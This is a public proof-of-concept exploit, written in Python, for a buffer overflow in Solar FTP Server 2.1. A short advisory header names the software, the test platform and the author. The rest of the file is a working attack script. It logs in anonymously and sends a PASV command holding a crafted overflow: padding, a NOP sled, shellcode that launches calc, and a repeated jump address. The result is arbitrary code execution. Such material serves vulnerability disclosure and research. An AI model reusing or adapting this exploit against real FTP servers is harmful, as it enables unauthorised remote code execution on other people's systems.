# ------------------------------------------------------------------------
# Software................Solar FTP Server 2.1
# Vulnerability...........Buffer Overflow
# Download................http://www.solarftp.com/
# Release Date............1/10/2011
# Tested On...............Windows XP SP3 EN
# ------------------------------------------------------------------------
# Author..................John Leitch
# Site....................http://www.johnleitch.net/
# Email...................john.leitch5@gmail.com
# ------------------------------------------------------------------------
# 
# --Description--
# 
# A buffer overflow in Solar FTP Server 2.1 can be exploited to execute
# arbitrary code.
# 
# 
# --PoC--

import socket

host = 'localhost'

port = 21

jmp_eax = '\xBF\x66\x02\x10'

junk = '\xCC\xCC\xCC\xCC'

nop_sled = '\x90\x90\x90' + '\x90\x90\x90\x90' * 2

# Calc shellcode by yours truly. Check the task manager
# as the calc instance will not be visible.
shell_code = "\x31\xC9"\
             "\x51"\
             "\x68\x63\x61\x6C\x63"\
             "\x54"\
             "\xB8\xC7\x93\xC2\x77"\
             "\xFF\xD0"

junk2 = 'A' * 7004


bad_stuff = junk + nop_sled + shell_code + jmp_eax * 249 + junk2
    
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(8)

print 'connecting'

s.connect((host, port))

print s.recv(8192)

s.send('USER anonymous\r\n')
print s.recv(8192)

s.send('PASS x@x.com\r\n')
print s.recv(8192)

s.send('PASV ' + bad_stuff + '\r\n')
print s.recv(8192)
s.close()

